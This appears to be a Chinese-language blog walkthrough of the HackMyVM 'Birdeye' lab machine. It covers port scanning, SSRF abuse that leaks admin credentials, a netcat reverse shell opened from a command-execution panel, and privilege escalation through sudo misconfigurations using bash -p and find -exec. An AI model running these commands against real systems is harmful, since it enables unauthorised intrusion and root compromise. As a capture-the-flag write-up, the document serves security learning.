{"pageProps":{"postData":{"id":"HackMyVMBirdeye","contentHtml":"<h1>Birdeye.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Birdeye\">https://hackmyvm.eu/machines/machine.php?vm=Birdeye</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMBirdeye/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-python\">➜  Birdeye nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.127</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">45</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.127</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00027</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">53</span>/tcp   <span class=\"hljs-built_in\">open</span>  domain\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">5000</span>/tcp <span class=\"hljs-built_in\">open</span>  upnp\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">17.44</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">➜  Birdeye nmap -sT -A -p <span class=\"hljs-number\">53</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">5000</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.127</span>                    \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">20</span>:02 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.127</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00046</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">53</span>/tcp   <span class=\"hljs-built_in\">open</span>  domain  ISC BIND <span class=\"hljs-number\">9.11</span><span class=\"hljs-number\">.3</span>-1ubuntu1<span class=\"hljs-number\">.18</span> (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: <span class=\"hljs-number\">9.11</span><span class=\"hljs-number\">.3</span>-1ubuntu1<span class=\"hljs-number\">.18</span>-Ubuntu\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.29</span> ((Ubuntu))\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.29</span> (Ubuntu)\n|_http-title: client\n|_http-cors: GET POST OPTIONS\n<span class=\"hljs-number\">5000</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Werkzeug httpd <span class=\"hljs-number\">2.0</span><span class=\"hljs-number\">.3</span> (Python <span class=\"hljs-number\">3.6</span><span class=\"hljs-number\">.9</span>)\n|_http-title: <span class=\"hljs-number\">404</span> Not Found\n|_http-server-header: Werkzeug/<span class=\"hljs-number\">2.0</span><span class=\"hljs-number\">.3</span> Python/<span class=\"hljs-number\">3.6</span><span class=\"hljs-number\">.9</span>\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X, MikroTik RouterOS <span class=\"hljs-number\">7.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span> cpe:/o:mikrotik:routeros:<span class=\"hljs-number\">7</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5.6</span><span class=\"hljs-number\">.3</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.19</span>, OpenWrt <span class=\"hljs-number\">21.02</span> (Linux <span class=\"hljs-number\">5.4</span>), MikroTik RouterOS <span class=\"hljs-number\">7.2</span> - <span class=\"hljs-number\">7.5</span> (Linux <span class=\"hljs-number\">5.6</span><span class=\"hljs-number\">.3</span>)\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.46</span> ms <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.127</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">29.38</span> seconds\n</code></pre>\n<h3>枚举</h3>\n<p>80 端口的搜索时发的包很奇怪</p>\n<p><img src=\"/post-images/HackMyVMBirdeye/image1.png\" alt=\"image.png\"></p>\n<p>看着存在 <code>SSRF</code></p>\n<p><img src=\"/post-images/HackMyVMBirdeye/image2.png\" alt=\"image.png\"></p>\n<p>改成 kali 的 IP 试试</p>\n<p><img src=\"/post-images/HackMyVMBirdeye/image3.png\" alt=\"image.png\"></p>\n<p>存在 <code>SSRF</code></p>\n<p><img src=\"/post-images/HackMyVMBirdeye/image4.png\" alt=\"image.png\"></p>\n<p>并且原本后面的 URL 是：<code>http://localhost:5000/api/products/?search=\"\"</code></p>\n<h2>SSRF</h2>\n<p>利用 SSRF 漏洞进行枚举</p>\n<p>首先枚举内网端口</p>\n<pre><code class=\"hljs language-python\">➜  Birdeye ffuf -u <span class=\"hljs-string\">'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/'</span> -w port -fc <span class=\"hljs-number\">500</span>\n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/\n :: Wordlist         : FUZZ: /root/Desktop/HackMyVM/Birdeye/port\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 500\n________________________________________________\n\n80                      [Status: 200, Size: 288, Words: 38, Lines: 8, Duration: 106ms]\n:: Progress: [10000/10000] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:29] :: Errors: 0 ::\n</span></code></pre>\n<p>我们再根据原本<code>403</code> 的地址进行访问，例如：</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-number\">403</span>      GET        <span class=\"hljs-number\">1l</span>        5w       32c http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.127</span>/admin/config\n<span class=\"hljs-number\">401</span>      GET        <span class=\"hljs-number\">1l</span>        1w       25c http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.127</span>/admin/dashboard\n</code></pre>\n<p>成功包含到账户密码，并且告诉我们 <code>/api/fetch-url</code> 支持 <code>GET, POST, OPTIONS</code> 三种方法</p>\n<pre><code class=\"hljs language-python\">➜  Birdeye curl -i <span class=\"hljs-string\">'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1/admin/config'</span>\nHTTP/<span class=\"hljs-number\">1.1</span> <span class=\"hljs-number\">200</span> OK\nDate: Fri, <span class=\"hljs-number\">17</span> Oct <span class=\"hljs-number\">2025</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">32</span>:01 GMT\nServer: Werkzeug/<span class=\"hljs-number\">2.0</span><span class=\"hljs-number\">.3</span> Python/<span class=\"hljs-number\">3.6</span><span class=\"hljs-number\">.9</span>\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-<span class=\"hljs-type\">Type</span>\nContent-<span class=\"hljs-type\">Type</span>: application/json\nContent-Length: <span class=\"hljs-number\">106</span>\nAccess-Control-Allow-Origin: *, *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-<span class=\"hljs-type\">Type</span>\n\n{<span class=\"hljs-string\">\"admin_password\"</span>:<span class=\"hljs-string\">\"SuperSecret123!\"</span>,<span class=\"hljs-string\">\"admin_user\"</span>:<span class=\"hljs-string\">\"superadmin\"</span>,<span class=\"hljs-string\">\"login_panel_path\"</span>:<span class=\"hljs-string\">\"/admin/panelloginpage\"</span>}\n</code></pre>\n<p>根据获取到内容访问后访问后台地址</p>\n<p><img src=\"/post-images/HackMyVMBirdeye/image5.png\" alt=\"image.png\"></p>\n<p>我们有必要发送 POST 数据（这里看了下 WP，没想到是这样更换方法），所以接上 <code>curl -i 'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&#x26;method=POST'</code></p>\n<pre><code class=\"hljs language-python\">➜  Birdeye curl -i <span class=\"hljs-string\">'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&#x26;method=POST'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> -d <span class=\"hljs-string\">'admin_user=superadmin&#x26;admin_password=SuperSecret123!'</span>\nHTTP/<span class=\"hljs-number\">1.1</span> <span class=\"hljs-number\">200</span> OK\nDate: Fri, <span class=\"hljs-number\">17</span> Oct <span class=\"hljs-number\">2025</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">35</span>:<span class=\"hljs-number\">48</span> GMT\nServer: Werkzeug/<span class=\"hljs-number\">2.0</span><span class=\"hljs-number\">.3</span> Python/<span class=\"hljs-number\">3.6</span><span class=\"hljs-number\">.9</span>\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-<span class=\"hljs-type\">Type</span>\nContent-<span class=\"hljs-type\">Type</span>: text/html; charset=utf-<span class=\"hljs-number\">8</span>\nContent-Length: <span class=\"hljs-number\">145</span>\nAccess-Control-Allow-Origin: *, *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-<span class=\"hljs-type\">Type</span>\nVary: Cookie,Accept-Encoding\n<span class=\"hljs-type\">Set</span>-Cookie: session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aPJGNA.-<span class=\"hljs-number\">3</span>-eVxjfstKta_I4ubREsK2pnAg; Domain=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.237</span>; Path=/\n\n    &#x3C;h2>Admin Dashboard&#x3C;/h2>\n    &#x3C;form method=<span class=\"hljs-string\">\"post\"</span>>\n        &#x3C;label>Command: &#x3C;<span class=\"hljs-built_in\">input</span> name=<span class=\"hljs-string\">\"command\"</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text\"</span>>&#x3C;/label>\n        &#x3C;button <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"s#   \n</span></code></pre>\n<p>这样就拿到了 <code>Cookie</code> ，我们存储在 <code>http://192.168.56.127/admin/dashboard</code> 中</p>\n<p><img src=\"/post-images/HackMyVMBirdeye/image6.png\" alt=\"image.png\"></p>\n<p>看样子是个命令执行的功能</p>\n<p><img src=\"/post-images/HackMyVMBirdeye/image7.png\" alt=\"image.png\"></p>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-python\">command=busybox nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.5</span> <span class=\"hljs-number\">1234</span> -e /<span class=\"hljs-built_in\">bin</span>/bash\n</code></pre>\n<h2>提权 - sev</h2>\n<p>查看 sudo 权限</p>\n<pre><code class=\"hljs language-python\">www-data@birdeye:~/birdeye$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on birdeye:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser www-data may run the following commands on birdeye:\n    (sev) NOPASSWD: /home/sev/backup_app.sh\n</code></pre>\n<p>查看内容，直接给了</p>\n<pre><code class=\"hljs language-python\">www-data@birdeye:~/birdeye$ cat /home/sev/backup_app.sh\n<span class=\"hljs-comment\">#!/bin/bash</span>\n/<span class=\"hljs-built_in\">bin</span>/bash -p\n</code></pre>\n<p>切换到 sev</p>\n<pre><code class=\"hljs language-python\">www-data@birdeye:~/birdeye$ sudo -u sev /home/sev/backup_app.sh \nsev@birdeye:~/birdeye$ \n</code></pre>\n<h2>提权 - root</h2>\n<pre><code class=\"hljs language-python\">sev@birdeye:~/birdeye$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> sev on birdeye:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser sev may run the following commands on birdeye:\n    (ALL) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/find\n</code></pre>\n<p>结束了</p>\n<pre><code class=\"hljs language-python\">sev@birdeye:~/birdeye$ sudo find . -<span class=\"hljs-built_in\">exec</span> /<span class=\"hljs-built_in\">bin</span>/sh \\; -quit\n<span class=\"hljs-comment\"># id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root\n</code></pre>\n<h2>总结</h2>\n<p>？</p>","title":"HackMyVM - Birdeye","date":"2025-10-17","updated":"2025-10-17","tags":["HackMyVM","Linux","SSRF","find"],"categories":"靶机","comments":true,"description":"Birdeye. https://hackmyvm.eu/machines/machine.php?vm=Birdeye Recon PortScan 枚举 80 端口的搜索时发的包很奇怪 看着存在 SSRF 改成 kali 的 IP 试试 存在 SSRF 并且原本后面的 URL 是：http://..."},"recentPosts":[{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true}